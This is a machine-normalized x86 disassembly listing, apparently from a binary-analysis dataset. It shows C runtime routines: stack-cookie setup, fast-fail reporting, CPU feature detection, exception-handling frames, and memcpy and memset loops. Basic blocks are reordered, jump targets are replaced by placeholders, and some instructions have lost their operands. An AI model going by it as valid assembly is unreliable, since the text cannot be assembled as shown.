push rw-data
call sub_42cfb6
neg eax
pop ecx
sbb al al
inc al
jmp r-xdata
xor al al
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_40cda7
push 0x8
push r--data
call sub_40d270
and [ ebp - 0x4 ] 0x0
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor al al
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx __dos_header
sub eax ecx
push eax
push ecx
call sub_40cb6f
pop ecx
pop ecx
test eax eax
je r-xdata
test [ eax + 0x24 ] 0x80000000
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov al 0x1
jmp r-xdata
call sub_40d2b6
retn
sub_40ce51
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_42d16d
push [ ebp + 0x8 ]
call sub_40e805
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
sub_40ce79
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
push [ ebp + 0x8 ]
ror eax cl
cmp eax 0xffffffff
jne r-xdata
push rw-data
call sub_42cff3
pop ecx
call sub_42cf83
jmp r-xdata
neg eax
pop ecx
sbb eax eax
not eax
and eax [ ebp + 0x8 ]
pop ebp
retn
sub_40ceb4
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
cmp eax 0xffffffff
jne r-xdata
push [ ebp + 0x8 ]
push rw-data
call sub_42cff3
pop ecx
pop ecx
pop ebp
retn
pop ebp
jmp sub_42cf6d
sub_40cefa
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
mov eax [ rw-data ]
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x14 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_40d022
push ebp
mov ebp esp
sub esp 0x324
push ebx
push esi
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor esi esi
lea eax [ ebp - 0x324 ]
push 0x2cc
push esi
push eax
mov [ rw-data ] esi
call sub_40dea0
add esp 0xc
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x278 ] ecx
mov [ ebp - 0x27c ] edx
mov [ ebp - 0x280 ] ebx
mov [ ebp - 0x284 ] esi
mov [ ebp - 0x288 ] edi
mov [ ebp - 0x25c ] ss
mov [ ebp - 0x268 ] cs
mov [ ebp - 0x28c ] ds
mov [ ebp - 0x290 ] es
mov [ ebp - 0x294 ] fs
mov [ ebp - 0x298 ] gs
pushfd
pop [ ebp - 0x264 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x26c ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x324 ] 0x10001
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x270 ] eax
lea eax [ ebp - 0x58 ]
push esi
push eax
call sub_40dea0
mov eax [ ebp + 0x4 ]
add esp 0xc
mov [ ebp - 0x58 ] 0x40000015
mov [ ebp - 0x54 ] 0x1
mov [ ebp - 0x4c ] eax
call [ IsDebuggerPresent@IAT ]
push esi
lea ebx [ eax - 0x1 ]
neg ebx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x324 ]
sbb bl bl
mov [ ebp - 0x4 ] eax
inc bl
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
int 0x29
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bl
neg eax
sbb eax eax
and [ rw-data ] eax
sub_40d13d
push ebp
mov ebp esp
sub esp 0x44
push 0x44
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call sub_40dea0
add esp 0xc
lea eax [ ebp - 0x44 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x18 ] 0x1
je r-xdata
push 0xa
pop eax
movzx eax [ ebp - 0x14 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40d173
push 0x0
call [ GetModuleHandleW@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
mov eax 0x5a4d
cmp [ ecx ] ax
jne r-xdata
xor al al
retn
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
jne r-xdata
cmp [ eax + 0x74 ] 0xe
jbe r-xdata
cmp [ eax + 0xe8 ] 0x0
setne al
retn
sub_40d1c3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_42d238
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_40d20c
push ebx
push esi
mov esi r--data
mov ebx r--data
cmp esi ebx
jae r-xdata
pop esi
pop ebx
retn
push edi
add esi 0x4
cmp esi ebx
jb r-xdata
mov ecx edi
call j_sub_40d4a2
call edi
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_40d237
push ebx
push esi
mov esi r--data
mov ebx r--data
cmp esi ebx
jae r-xdata
pop esi
pop ebx
retn
push edi
add esi 0x4
cmp esi ebx
jb r-xdata
mov ecx edi
call j_sub_40d4a2
call edi
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_40d270
push sub_40e520
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax

sub_40d2d2
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40c377
pop ecx
pop ecx
sub_40d2f5
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x2c
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
and [ ebp - 0x14 ] 0x0
xor eax eax
or [ rw-data ] 0x2
xor ecx ecx
push esi
push edi
mov [ rw-data ] ebx
lea edi [ ebp - 0x2c ]
push ebx
cpuid
mov esi ebx
pop ebx
mov [ edi ] eax
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
xor ecx 0x49656e69
mov eax [ ebp - 0x24 ]
xor eax 0x6c65746e
or ecx eax
mov eax [ ebp - 0x28 ]
xor eax 0x756e6547
or ecx eax
neg ecx
push 0x1
pop eax
sbb cl cl
push 0x0
add cl 0x1
pop ecx
push ebx
cpuid
mov esi ebx
pop ebx
mov [ edi ] eax
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
je r-xdata
mov edi [ rw-data ]
mov eax [ ebp - 0x2c ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
pop edi
pop esi
test eax 0x100000
je r-xdata
push 0x7
pop eax
xor ecx ecx
push ebx
cpuid
mov esi ebx
pop ebx
lea ebx [ ebp - 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] edx
mov eax [ ebp - 0x28 ]
test eax 0x200
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
je r-xdata
mov edi [ rw-data ]
or edi 0x1
mov [ rw-data ] edi
jmp r-xdata
cmp eax 0x20660
je r-xdata
or [ rw-data ] 0x4
mov [ rw-data ] 0x2
test eax 0x8000000
je r-xdata
or edi 0x2
mov [ rw-data ] edi
cmp [ ebp - 0xc ] 0x7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x18 ] eax
jl r-xdata
cmp eax 0x20670
je r-xdata
test eax 0x10000000
je r-xdata
cmp eax 0x30650
je r-xdata
xor ecx ecx
xgetbv
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
and eax 0x6
xor ecx ecx
cmp eax 0x6
jne r-xdata
cmp eax 0x30660
je r-xdata
test ecx ecx
jne r-xdata
cmp eax 0x30670
jne r-xdata
mov eax [ rw-data ]
or eax 0x8
mov [ rw-data ] 0x3
test [ ebp - 0x14 ] 0x20
mov [ rw-data ] eax
je r-xdata
or eax 0x20
mov [ rw-data ] 0x5
mov [ rw-data ] eax
sub_40d4b5
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
lea ecx [ ebp - 0x18 ]
and [ ebp - 0x18 ] 0x0
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_40d6f1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40ec30
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov esp ebp
pop ebp
retn
sub_40d515
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_40d7b4
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_40eb5b
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call [ r--data ]
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x4 ]
pop ecx
pop ecx
and [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
sub_40d5f2
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx ecx
mov ebx [ edi + 0x10 ]
mov [ ebp - 0x4 ] ecx
test esi esi
js r-xdata
mov eax [ ebp + 0x14 ]
inc ecx
mov [ eax ] ecx
mov eax [ ebp + 0x18 ]
mov [ eax ] edx
cmp edx [ edi + 0xc ]
ja r-xdata
imul eax ecx 0x14
add eax 0x8
add eax ebx
call sub_42d238
cmp ecx edx
ja r-xdata
mov edi [ ebp + 0x10 ]
sub eax 0x14
dec ecx
cmp [ eax - 0x4 ] edi
mov edi [ ebp + 0x8 ]
jge r-xdata
imul eax ecx 0x14
pop edi
pop esi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0xffffffff
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi [ eax ]
mov edi [ ebp + 0x8 ]
jle r-xdata
test esi esi
jns r-xdata
mov edx [ ebp - 0x4 ]
dec esi
mov [ ebp - 0x4 ] ecx
cmp ecx 0xffffffff
je r-xdata
sub_40d66a
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_40d69c
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40d6f1
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40c38e
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_40fc8b
add esp 0x20
pop esi
pop ebp
retn
sub_40d722
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_40eb5b
mov ecx [ eax + 0x24 ]
mov [ esi + 0x4 ] ecx
call sub_40eb5b
mov [ eax + 0x24 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_40d746
push ebp
mov ebp esp
push esi
call sub_40eb5b
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x24 ]
jne r-xdata
call sub_40eb5b
mov ecx [ eax + 0x24 ]
jmp r-xdata
call sub_40eb5b
mov ecx [ esi + 0x4 ]
mov [ eax + 0x24 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
call sub_42d238
pop esi
pop ebp
retn
sub_40d78e
push ebp
mov ebp esp
call sub_40eb5b
mov eax [ eax + 0x24 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_40d7b4
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40c38e
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_40fc8b
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_40d515
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40d69c
pop ebx
mov esp ebp
pop ebp
retn
sub_40d853
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fc8b
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40d889
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fc8b
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40d8bf
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fc8b
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40d8f5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40fef1
push [ esi + 0x1c ]
push [ esi + 0x28 ]
push 0x0
push [ esi + 0x18 ]
call sub_40fb75
add esp 0x14
pop esi
pop ebp
retn 0x4
sub_40d920
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x20
jb r-xdata
cmp edi eax
jb r-xdata
and ecx 0x1f
je r-xdata
cmp ecx 0x80
jae r-xdata
lea esi [ ecx + esi ]
lea edi [ ecx + edi ]
cmp ecx 0x20
jb r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax ecx
shr ecx 0x2
je r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
test ecx 0xfffffffc
je r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
add edi 0x4
add esi 0x4
sub ecx 0x1
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
[ edi ] [ esi ]
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test ecx ecx
je r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
sub edi 0x4
sub esi 0x4
mov eax [ esi ]
mov [ edi ] eax
sub ecx 0x4
test ecx 0xfffffffc
jne r-xdata
test edi 0xf
je r-xdata
test edi 0x3
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov edx ecx
shr edx 0x5
test edx edx
je r-xdata
test edi 0x3
je r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
sub edi 0x1
sub esi 0x1
mov al [ esi ]
mov [ edi ] al
sub ecx 0x1
jne r-xdata
cmp ecx 0x80
jb r-xdata
dec ecx
dec esi
dec edi
mov al [ esi ]
mov [ edi ] al
test edi 0xf
jne r-xdata
cmp ecx 0x20
jb r-xdata
mov edx edi
and edx 0x3
sub ecx edx
lea esp [ esp ]
lea ecx [ ecx ]
test edi 0x3
jne r-xdata
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
lea ebx [ ebx ]
mov edx ecx
cmp ecx 0x20
jb r-xdata
mov al [ esi ]
mov [ edi ] al
dec ecx
add esi 0x1
add edi 0x1
test edi 0x3
jne r-xdata
cmp ecx 0x20
jb r-xdata
sub esi 0x80
sub edi 0x80
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu xmm2 [ esi + 0x20 ]
movdqu xmm3 [ esi + 0x30 ]
movdqu xmm4 [ esi + 0x40 ]
movdqu xmm5 [ esi + 0x50 ]
movdqu xmm6 [ esi + 0x60 ]
movdqu xmm7 [ esi + 0x70 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
movdqu [ edi + 0x20 ] xmm2
movdqu [ edi + 0x30 ] xmm3
movdqu [ edi + 0x40 ] xmm4
movdqu [ edi + 0x50 ] xmm5
movdqu [ edi + 0x60 ] xmm6
movdqu [ edi + 0x70 ] xmm7
sub ecx 0x80
test ecx 0xffffff80
jne r-xdata
mov edx ecx
shr ecx 0x2
and edx 0x3
sub esi 0x4
sub edi 0x4
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + r-xdata ]
mov al [ esi - 0x1 ]
mov [ edi - 0x1 ] al
dec esi
dec edi
sub edx 0x1
jne r-xdata
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
lea esi [ esi + 0x20 ]
lea edi [ edi + 0x20 ]
dec edx
jne r-xdata
shr ecx 0x2
[ edi ] [ esi ]
and edx 0x3
jmp [ edx * 4 + r-xdata ]
sub esi 0x20
sub edi 0x20
movdqu xmm0 [ esi ]
movdqu xmm1 [ esi + 0x10 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm1
sub ecx 0x20
test ecx 0xffffffe0
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
lea esp [ esp ]
mov edi edi
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov edi edi
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + r-xdata ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_40dea0
mov ecx [ esp + 0xc ]
movzx eax [ esp + 0x8 ]
mov edx edi
mov edi [ esp + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x4 ]
mov edi edx
retn
imul eax eax 0x1010101
cmp ecx 0x20
jle r-xdata
test ecx 0x3
je r-xdata
cmp ecx 0x80
jl r-xdata
test ecx 0x4
je r-xdata
mov [ edi ] al
inc edi
sub ecx 0x1
test ecx 0x3
jne r-xdata
bt [ rw-data ] 0x1
jae r-xdata
bt [ rw-data ] 0x1
jae r-xdata
test ecx 0xfffffff8
je r-xdata
mov [ edi ] eax
add edi 0x4
sub ecx 0x4
movd xmm0 eax
pshufd xmm0 xmm0 0x0
bt [ rw-data ] 0x1
jae r-xdata
[ edi ]
mov eax [ esp + 0x4 ]
mov edi edx
retn
lea esp [ esp ]
lea ebx [ ebx ]
lea edi [ ecx + edi - 0x20 ]
movdqu [ edi ] xmm0
movdqu [ edi + 0x10 ] xmm0
mov eax [ esp + 0x4 ]
mov edi edx
retn
